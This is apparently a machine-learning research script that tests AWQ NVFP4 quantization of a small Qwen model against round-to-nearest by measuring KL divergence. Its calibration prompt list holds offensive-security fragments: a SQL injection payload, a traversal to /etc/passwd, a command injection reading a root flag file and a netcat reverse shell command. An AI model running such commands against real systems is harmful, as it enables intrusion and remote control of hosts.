"""
AWQ Experiment — NVFP4 edition (ModelOpt AWQ algorithm, no LoRA, no backprop).

AWQ (Activation-aware Weight Quantization, MLSys 2024 best paper) finds the ~1%
of weight channels that matter most by looking at activation magnitudes, then
scales them up before quantization so the FP4 grid hurts them less.

  Original : y = Q(W) · x
  AWQ      : y = Q(W · diag(s)) · (diag(s)⁻¹ · x)
                    ↑                       ↑
            weights scaled UP        activations scaled DOWN
            (protected from          (folded into prev layernorm —
             quantization)            free at runtime)

  s = s_x^α   where s_x = mean activation magnitude (from calibration data),
              α ∈ [0,1] found via grid search — NO backprop, NO teacher.

Format alignment (Option B — same NVFP4 grid for all three methods):
  QAD       — NVFP4 via ModelOpt (algorithm="max",       then KL distillation)
  AutoRound — NVFP4 via AutoRound (data_type="nv_fp4",   sign-grad rounding opt)
  AWQ       — NVFP4 via ModelOpt (algorithm="awq_lite",  per-channel scaling)
  All three produce true NVFP4: E2M1 + block=16 + two-level FP8/FP32 scaling.

Same measurement structure for direct comparison:
  Oracle KL  : BF16 vs BF16 ≈ 0                          (shared target)
  RTN    KL  : BF16 vs NVFP4 round-to-nearest            (quantization damage)
  Post-AWQ KL: BF16 vs NVFP4 with AWQ scaling            (after grid search)
  % recovered = (RTN_KL - post_KL) / (RTN_KL - oracle_KL)

Knobs: ALGORITHM · TEMPERATURE · MAX_NEW_TOKENS · PROMPTS

Why no STEPS / LR / ITERS knob:
  AWQ has no training loop. The only "tuning" is the algorithm variant
  ("awq_lite", "awq_clip", "awq_full") — each does its own internal search.
"""

import copy
import time
import torch
import torch.nn.functional as F
from transformers import AutoTokenizer, AutoModelForCausalLM
import modelopt.torch.quantization as mtq

# ── CONFIG ────────────────────────────────────────────────────────────────────

MODEL_NAME     = "Qwen/Qwen3-0.6B"   # swap to 14B on server
DEVICE         = "cuda" if torch.cuda.is_available() else "cpu"
MAX_NEW_TOKENS = 80
TEMPERATURE    = 2.0

# AWQ algorithm variant (ModelOpt):
#   "awq_lite" — per-channel α grid search        (original AWQ, fast)
#   "awq_clip" — per-block weight clipping only   (lighter, often weaker)
#   "awq_full" — lite + clip                      (slowest, best recovery)
ALGORITHM = "awq_lite"

# NVFP4 + AWQ: same canonical W4A4 NVFP4 recipe as QAD, but with
# algorithm="awq_lite" instead of the default "max" (RTN) calibration.
NVFP4_AWQ_CFG = copy.deepcopy(mtq.NVFP4_DEFAULT_CFG)
NVFP4_AWQ_CFG["algorithm"] = ALGORITHM

# Plain RTN baseline — same NVFP4 grid, no AWQ scaling.
NVFP4_RTN_CFG = mtq.NVFP4_DEFAULT_CFG

PROMPTS = [
    "You are a security agent. The target is http://10.0.0.5. Goal: retrieve the flag.",
    "nmap -sV 10.0.0.5 reveals port 80 open. The next step is",
    "curl -s http://10.0.0.5/ shows a ping form. This is a classic",
    "Command injection confirmed: uid=0(root). Reading the flag with",
    "The flag is located at /root/flag.txt. To retrieve it via command injection:",
    "SQL injection payload: ' OR 1=1 --. The response from the server was",
    "Directory traversal: ../../../../etc/passwd. The file contains",
    "Netcat reverse shell: nc -e /bin/bash 10.0.0.1 4444. Connection established.",
]

# ── MODEL LOADING ─────────────────────────────────────────────────────────────

print(f"Device: {DEVICE}  |  Model: {MODEL_NAME}\n")
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token


def load_teacher() -> torch.nn.Module:
    """BF16 full-precision model — frozen reference for KL measurement."""
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )
    model.eval()
    for p in model.parameters():
        p.requires_grad = False
    return model


def load_nvfp4(calibration_data: list[torch.Tensor], cfg: dict) -> torch.nn.Module:
    """
    NVFP4 model via ModelOpt fake quantization.

    cfg = NVFP4_RTN_CFG  → algorithm="max"      → plain round-to-nearest
    cfg = NVFP4_AWQ_CFG  → algorithm="awq_lite" → AWQ per-channel scaling search

    Both run the same calibration forward pass to collect activation statistics.
    For AWQ those stats also drive the α grid search; for RTN they only set
    the per-block FP8 scales.
    """
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )

    def calibration_forward(model):
        for seq in calibration_data:
            with torch.no_grad():
                model(input_ids=seq)

    mtq.quantize(model, config=cfg, forward_loop=calibration_forward)
    model.eval()
    return model


# ── CALIBRATION DATA GENERATION ───────────────────────────────────────────────

def generate_calibration_data(
    teacher: torch.nn.Module,
    prompts: list[str],
    max_new_tokens: int,
) -> list[torch.Tensor]:
    """
    Use the teacher to generate full sequences from prompts.
    AWQ needs activation distributions — token sequences alone are enough,
    no labels required (same as QAD and AutoRound).
    """
    sequences = []
    print("Generating calibration sequences from teacher...")
    for prompt in prompts:
        input_ids = tokenizer.encode(prompt, return_tensors="pt").to(DEVICE)
        with torch.no_grad():
            output = teacher.generate(
                input_ids,
                max_new_tokens=max_new_tokens,
                do_sample=True,
                temperature=0.7,
                pad_token_id=tokenizer.pad_token_id,
            )
        sequences.append(output)
        print(f"  [{len(sequences)}/{len(prompts)}] {output.shape[1]} tokens")
    print(f"Calibration data: {len(sequences)} sequences\n")
    return sequences


# ── KL MEASUREMENT ────────────────────────────────────────────────────────────

def measure_kl(
    model_a: torch.nn.Module,
    model_b: torch.nn.Module,
    calibration_data: list[torch.Tensor],
    temperature: float,
    label: str,
) -> float:
    model_a.eval()
    model_b.eval()
    total_kl = 0.0
    with torch.no_grad():
        for seq in calibration_data:
            logits_a = model_a(input_ids=seq).logits.clamp(-100, 100)
            logits_b = model_b(input_ids=seq).logits.clamp(-100, 100)
            kl = F.kl_div(
                F.log_softmax(logits_b / temperature, dim=-1),
                F.softmax(logits_a  / temperature, dim=-1),
                reduction="batchmean",
            ) * (temperature ** 2)
            total_kl += kl.item()
    avg_kl = total_kl / len(calibration_data)
    print(f"  {label:<55} KL = {avg_kl:.4f}")
    return avg_kl


# ── MAIN ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=== Loading Teacher (BF16, frozen) ===")
    teacher = load_teacher()

    print("\n=== Generating Calibration Data ===")
    calibration_data = generate_calibration_data(teacher, PROMPTS, MAX_NEW_TOKENS)

    # ── Baselines ─────────────────────────────────────────────────────────────
    print("=== Baselines ===")

    kl_oracle = measure_kl(
        teacher, teacher, calibration_data, TEMPERATURE,
        "Oracle — BF16 vs BF16",
    )

    print("\n  Loading NVFP4-RTN model (algorithm='max', no AWQ)...")
    t0 = time.perf_counter()
    rtn_model = load_nvfp4(calibration_data, cfg=NVFP4_RTN_CFG)
    rtn_time = time.perf_counter() - t0

    kl_rtn = measure_kl(
        teacher, rtn_model, calibration_data, TEMPERATURE,
        "RTN — NVFP4 round-to-nearest (no opt)",
    )
    del rtn_model
    torch.cuda.empty_cache()

    total_gap = kl_rtn - kl_oracle

    # ── AWQ ───────────────────────────────────────────────────────────────────
    print(f"\n=== AWQ ({ALGORITHM}) ===")
    print(f"  Loading NVFP4-AWQ model (algorithm='{ALGORITHM}')...")
    t0 = time.perf_counter()
    awq_model = load_nvfp4(calibration_data, cfg=NVFP4_AWQ_CFG)
    awq_time = time.perf_counter() - t0

    kl_post = measure_kl(
        teacher, awq_model, calibration_data, TEMPERATURE,
        f"Post-AWQ — NVFP4 + {ALGORITHM} scaling",
    )

    # ── Results ───────────────────────────────────────────────────────────────
    recovered = kl_rtn - kl_post
    pct       = recovered / total_gap * 100 if total_gap > 0 else 0.0

    print(f"""
=== Full Comparison ===
  Oracle  (BF16, target)              : {kl_oracle:.4f}   ← ideal, should be ~0
  RTN     (NVFP4, no opt)             : {kl_rtn:.4f}   time: {rtn_time:.1f}s
  Post-AWQ (NVFP4 + {ALGORITHM:<9})       : {kl_post:.4f}   time: {awq_time:.1f}s

  Gap closed : {recovered:.4f} / {total_gap:.4f} = {pct:.1f}% recovered toward oracle

Config: algorithm={ALGORITHM}  bits=4  block=16  T={TEMPERATURE}
Knobs  : ALGORITHM · TEMPERATURE · MAX_NEW_TOKENS · PROMPTS

--- vs QAD and AutoRound ---
  All three target identical NVFP4 grid (E2M1 + block=16 + FP8/FP32 scale).
  AWQ      — pre-quant per-channel scaling, grid search on α     (no backprop, no teacher)
  AR       — sign-grad rounding optimization within the grid     (no backprop on weights, no teacher)
  QAD      — KL distillation into quantized weights via STE      (full backprop, BF16 teacher)
  Post KL is directly comparable — lower = closer to BF16 teacher.
  Expected ordering on accuracy : QAD ≥ AR ≥ AWQ ≥ RTN
  Expected ordering on speed    : AWQ ≪ AR < QAD""")
